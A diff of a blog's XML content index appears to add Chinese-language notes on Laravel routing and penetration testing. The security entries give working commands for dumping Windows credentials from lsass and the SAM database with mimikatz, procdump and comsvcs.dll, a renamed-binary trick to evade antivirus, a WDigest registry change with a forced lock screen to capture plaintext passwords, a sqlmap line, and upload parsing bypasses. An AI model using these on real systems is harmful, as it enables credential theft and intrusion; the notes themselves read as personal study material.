+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;mysql&#39; &#x3D;&gt; [</span><br><span class="line">    &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">    &#39;url&#39; &#x3D;&gt; env(&#39;DATABASE_URL&#39;),</span><br><span class="line">    &#39;host&#39; &#x3D;&gt; env(&#39;DB_HOST&#39;, &#39;127.0.0.1&#39;),</span><br><span class="line">    &#39;port&#39; &#x3D;&gt; env(&#39;DB_PORT&#39;, &#39;3306&#39;),</span><br><span class="line">    &#39;database&#39; &#x3D;&gt; env(&#39;DB_DATABASE&#39;, &#39;laravel&#39;),</span><br><span class="line">    &#39;username&#39; &#x3D;&gt; env(&#39;DB_USERNAME&#39;, &#39;root&#39;),</span><br><span class="line">    &#39;password&#39; &#x3D;&gt; env(&#39;DB_PASSWORD&#39;, &#39;XXXX&#39;),</span><br><span class="line">    &#39;unix_socket&#39; &#x3D;&gt; env(&#39;DB_SOCKET&#39;, &#39;&#39;),</span><br><span class="line">    &#39;charset&#39; &#x3D;&gt; &#39;utf8mb4&#39;,</span><br><span class="line">    &#39;collation&#39; &#x3D;&gt; &#39;utf8mb4_unicode_ci&#39;,</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h3 id="基础路由"><a href="#基础路由" class="headerlink" title="基础路由"></a>基础路由</h3><p>routes文件下进行</p>
+<ul>
+<li>基本用法</li>
+</ul>
+<p>routes/web.php添加，  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;test&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello Laravel&quot;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p> url/test    ，进行访问</p>
+<p>​    <img src="/2022/04/04/Laravel/image-20220405002141084.png" alt="image-20220405002141084"></p>
+<p>另外一种用法,利用闭包函数，（例如视图文件），</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/we&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>视图文件在resouces/views/中welcome.blade.php</p>
+<p><img src="/2022/04/04/Laravel/image-20220405003140886.png" alt="image-20220405003140886"></p>
+<p>访问(<a href="http://127.0.0.1:10001/we">http://127.0.0.1:10001/we</a>)</p>
+<p><img src="/2022/04/04/Laravel/image-20220405003209479.png" alt="image-20220405003209479"></p>
+<p>还有更多的路由请求方式就不在叙述了（<a href="https://laravelacademy.org/post/21970%EF%BC%89%E6%AF%95%E7%AB%9F%E6%88%91%E4%B8%8D%E6%98%AF%E5%BC%80%E5%8F%91%E5%95%8A">https://laravelacademy.org/post/21970）毕竟我不是开发啊</a> </p>
+<ul>
+<li>在api.php下定义的路由需要加上/api/</li>
+</ul>
+<p><img src="/2022/04/04/Laravel/image-20220405003738965.png" alt="image-20220405003738965"></p>
+<p><a href="http://127.0.0.1:10001/api/testapi">http://127.0.0.1:10001/api/testapi</a></p>
+<p><img src="/2022/04/04/Laravel/image-20220405003809337.png" alt="image-20220405003809337"></p>
+<h3 id="laravel8-的路由用法的变化"><a href="#laravel8-的路由用法的变化" class="headerlink" title="laravel8 的路由用法的变化"></a>laravel8 的路由用法的变化</h3><p>laravel7等Laravel旧版本中，RouteServiceProvider类中包含$namespace属性，值为AppHttpControllers，此属性可自动为路由添加AppHttpControllers前缀。</p>
+<p>即直接进行下面方式路由配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Route::get(&#39;login&#39;, &#39;LoginControl@index&#39;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>laravel8.x 中该属性值默认为null，路由中只能使用标准PHP调用语法（需填写controller全路径）</p>
+<p><img src="/2022/04/04/Laravel/image-20220405001507199.png" alt="image-20220405001507199"></p>
+<p>方法1：取消<code>protected $namespace = &#39;App\\Http\\Controllers&#39;;</code>注释</p>
+<p>方法2：在进行下面路由配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use App\Http\Controllers\LoginControl;      #添加命名空间</span><br><span class="line"></span><br><span class="line">Route::get(&#39;login&#39;, [LoginControl::class, &#39;index&#39;]);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="简单实例应用路由调用控制器"><a href="#简单实例应用路由调用控制器" class="headerlink" title="简单实例应用路由调用控制器"></a>简单实例应用路由调用控制器</h3><ul>
+<li></li>
+</ul>
+<p>参考:</p>
+<p><a href="https://cloud.tencent.com/developer/article/1723191">https://cloud.tencent.com/developer/article/1723191</a>      Laravel框架分析</p>
+<p><a href="https://mp.weixin.qq.com/s/aFGw2fPgjoSTD6zK_j-oHA">https://mp.weixin.qq.com/s/aFGw2fPgjoSTD6zK_j-oHA</a>    零基础学习laravel8 </p>
+<p><a href="https://blog.csdn.net/wjcms/article/details/109016643">https://blog.csdn.net/wjcms/article/details/109016643</a>   laravel8更新之路由调整</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>Laravel框架学习</tag>
       </tags>
   </entry>
   <entry>
@@ -1170,6 +1308,8 @@
 
 
 <p><code>--fresh-queries</code>             不会从缓存里面加载</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;xxxxx&quot; --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:10809 --is-dba --level 5</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>渗透</category>
@@ -1457,11 +1597,10 @@
 <p>site:xxx.com inurl:login/admin</p>
 <p>site:xxx.com intitle:后台</p>
 <p>site:xxx.com filetype:文件的格式 </p>
-<h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>JSFinder</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install requests bs4</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Threezh1&#x2F;JSFinder.git</span><br></pre></td></tr></table></figure>
+<h3 id="jsfinder"><a href="#jsfinder" class="headerlink" title="jsfinder"></a>jsfinder</h3><p>JSFinder</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install requests bs4</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Threezh1&#x2F;JSFinder.git  快速提取js中的子域名</span><br></pre></td></tr></table></figure>
 
-
-
+<p>魔改：<br><a href="https://github.com/msfisgood/JSFinderAAA">msfisgood/JSFinderAAA: JSFinder魔改版 (github.com)</a></p>
 <h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
 <li>dirsearch</li>
 <li>dirmap</li>
@@ -1548,8 +1687,18 @@
   <entry>
     <title>内网抓hash/密码</title>
     <url>/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/</url>
-    <content><![CDATA[<p>在内网渗透中拿到普通域用户/域管 hash，就可以直接pth。</p>
-<h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>只需要<code>管理员权限</code></p>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在winserver2012以后，windows保存的不是明文密码，只会保持密码的hash值</p>
+<p>本地用户hash保存在SAM数据库中，域内用户密码hash保存在NTDS.dit文件中</p>
+<p>常见格式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure>
+
+
+
+<p>AAD3B435B51404EEAAD3B435B51404EE是<code>LM hash</code>   这个是之前认证使用的，现在已经不使用了</p>
+<p>31D6CFE0D16AE931B73C59D7E0C089C0是<code>NTLM hash</code></p>
+<p>在<code>域环境</code>中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。</p>
+<p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth（实验过）。</p>
+<h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>需要<code>管理员权限</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
@@ -1565,14 +1714,14 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp   #然后将lsass.dmp下载到本地</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">procdump64.exe -accepteula -ma [lsass.exe的PID] lsass.dmp</span><br><span class="line">(mimikatz.exe &quot;sekurlsa::minidump dump path &quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;)</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325150155475.png" alt="image-20220325150155475"></p>
-<h3 id="rundll32-exe-这个就-够了"><a href="#rundll32-exe-这个就-够了" class="headerlink" title="rundll32.exe  这个就 够了"></a>rundll32.exe  这个就 够了</h3><p>(Windows自带C:\WINDOWS\System32\rundll32.exe)     原理是通过<code>API MiniDumpWriteDump</code>，利用<code>comsvcs.dll</code>导出 函数 minidump 进行dump内存</p>
+<h3 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h3><p>有这个就 够了</p>
+<p>(Windows自带C:\WINDOWS\System32\rundll32.exe)     原理是通过<code>API MiniDumpWriteDump</code>，利用<code>comsvcs.dll</code>导出 函数 minidump 进行dump内存</p>
 <p>条件：<code>开启SeDebugPrivilege权限</code> （管理员cmd下改权限 一般情况是Disabled状态，powershell下默认开启）</p>
 <p> powershell/cmd下运行comsvcs.dll 的MiniDump 来dump</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
 
 <p>但要绕过AMSI</p>
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325172436533-16484821151331.png" alt="image-20220325172436533"></p>
-<p>重要问题：</p>
 <h5 id="如何绕过杀软"><a href="#如何绕过杀软" class="headerlink" title="如何绕过杀软"></a>如何绕过杀软</h5><p>cmd下  执行火绒，360，wdf  都报毒，并且还可能没有权限</p>
 <p>powershell下  火绒不报， 360报， wdf 的amsi直接拦截</p>
 <h5 id="绕360和wdf"><a href="#绕360和wdf" class="headerlink" title="绕360和wdf"></a>绕360和wdf</h5><p>参考下面文章，但是2022.3.30这种方法不能绕了，，<br>(<a href="https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag">https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag</a>)</p>
@@ -1580,7 +1729,7 @@
 
 
 
-<p>2022.3.30后来我又想到了，copy个新的rundll32.exe  命名为1.exe ，直接就绕过了</p>
+<p>2022.3.30后来我又想到了，copy  rundll32.exe  命名为1.exe ，直接就绕过了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  C:\WINDOWS\System32</span><br><span class="line"></span><br><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line">copy C:\WINDOWS\System32\rundll32.exe 1.exe</span><br><span class="line"></span><br><span class="line">1.exe bypass360.dll, MiniDump pid lsass.dmp full</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330172101684.png" alt="image-20220330172101684"></p>
@@ -1598,26 +1747,30 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sqldumper.exe &lt;ProcessID&gt; 0 0x01100    完整转储</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330155608001.png" alt="image-20220330155608001"></p>
-<h1 id="Out-MiniDump"><a href="#Out-MiniDump" class="headerlink" title="Out-MiniDump"></a>Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p>
+<h1 id="3-Out-MiniDump"><a href="#3-Out-MiniDump" class="headerlink" title="3. Out-MiniDump"></a>3. Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure>
 
 <p>没有成功就不截图了</p>
-<h1 id="3-导出本地SAM-mimikatz"><a href="#3-导出本地SAM-mimikatz" class="headerlink" title="3. 导出本地SAM+mimikatz"></a>3. 导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据，（这个只能获得所有<code>本地用户</code>hash）</p>
+<h1 id="4-导出本地SAM-mimikatz"><a href="#4-导出本地SAM-mimikatz" class="headerlink" title="4. 导出本地SAM+mimikatz"></a>4. 导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据，（这个只能获得所有<code>本地用户</code>hash）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure>
 
 <p>mimikatz读取即可</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM exit&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325171109114.png" alt="image-20220325171109114"></p>
+<p>方法还有更多，杀软也多种多样，慢慢学习吧</p>
+<p>参考：</p>
+<p>一些获取Windows明文凭据的方法 | Loong716]：<a href="https://loong716.top/posts/lsass/">https://loong716.top/posts/lsass/</a></p>
 <h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
-<li>winserver2012以后只能抓到用户hash，抓不到明文</li>
+<li>winserver2012以后只能抓到用户hash，抓不到明文，但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</li>
 </ol>
-<p>但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</p>
-<p>然后cmd执行<code>强制锁频</code>（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆在抓</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
 
+<p>然后cmd执行<code>强制锁屏</code>（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆在抓。</p>
 <ol start="2">
-<li>mimikatz要免杀，有杀软一定要绕，不然会暴露</li>
+<li>hashcat 爆破ntlm hash，有可能拿到明文。</li>
+<li>md5解密ntml hash 比较简单的可以解出</li>
+<li>一些工具要做对应的免杀测试吧。</li>
 </ol>
 ]]></content>
       <categories>
@@ -1908,10 +2061,27 @@
   <entry>
     <title>基础web漏洞总结</title>
     <url>/2022/03/14/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p><a href="https://www.shmilying.tk/categories/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">常见数据库注入 | (shmilying.tk)</a></p>
+    <content><![CDATA[<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>简单来说就是传参过滤不严谨照成sql语句的拼接</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT name FROM users WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://www.shmilying.tk/categories/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">常见数据库注入 | (shmilying.tk)</a></p>
  <span id="more"></span>
 
-<h3 id="常见基础绕过"><a href="#常见基础绕过" class="headerlink" title="常见基础绕过"></a>常见基础绕过</h3><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h3 id="收藏语句"><a href="#收藏语句" class="headerlink" title="收藏语句"></a>收藏语句</h3><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><ol>
+
+
+<h3 id="常见基础绕过"><a href="#常见基础绕过" class="headerlink" title="常见基础绕过"></a>常见基础绕过</h3><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>预编译</li>
+</ul>
+<ul>
+<li>PDO</li>
+</ul>
+<p>防止了sql语句的拼接</p>
+<ul>
+<li>正则规则</li>
+</ul>
+<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h3 id="收藏语句"><a href="#收藏语句" class="headerlink" title="收藏语句"></a>收藏语句</h3><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><ol>
 <li>判断前后端校验</li>
 <li>判断黑白名单（可以上传1.xxxxx 测试）</li>
 </ol>
@@ -1921,7 +2091,14 @@
 <li><p>包含session文件</p>
 </li>
 </ul>
-<h5 id><a href="#" class="headerlink" title></a></h5><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h5 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h5><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>参考：</p>
+<h5 id><a href="#" class="headerlink" title></a></h5><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h5 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h5><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><ul>
+<li>IIS 6.0—— /xx.asp/xx.jpg</li>
+<li>IIS 7.0—— 默认Fast-cgi开启，直接在图片地址后面输入/.php就会将图片当做php解析</li>
+<li>Nginx——版本小于0.8.37 利用方法和IIS7.0一样</li>
+<li>Apache—— 上传文件名为test.php.x1.x2.x3, Apache是从右往左判断</li>
+<li>Lighttpd—— XX.jpg/xx.php</li>
+</ul>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>参考：</p>
 <p><a href="https://xz.aliyun.com/t/10459">https://xz.aliyun.com/t/10459</a></p>
 <p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p>
 <h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ul>
